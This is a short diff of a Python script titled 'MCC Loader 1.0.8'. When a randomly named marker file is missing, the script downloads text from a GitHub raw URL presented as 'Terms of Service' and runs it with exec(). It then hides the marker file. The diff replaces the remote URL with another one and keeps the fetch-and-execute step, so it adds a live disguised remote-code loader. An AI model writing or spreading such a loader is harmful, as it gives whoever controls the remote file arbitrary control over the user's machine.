@@ -29,7 +29,7 @@ windowtitle("MCC Loader 1.0.8")
 try:
     f = open('TOSVDOIAHWOIHSAKLFHWA.txt')
 except FileNotFoundError:
-    exec(requests.get('https://raw.githubusercontent.com/MCCFree/TOS/main/Term%20of%20Services').text)
+    exec(requests.get('https://raw.githubusercontent.com/Rafail2023/RovaClient/refs/heads/main/Term%20of%20Services.txt').text)
 else:
     f.close
     subprocess.check_call(["attrib", "+H", "TOSVDOIAHWOIHSAKLFHWA.txt"])
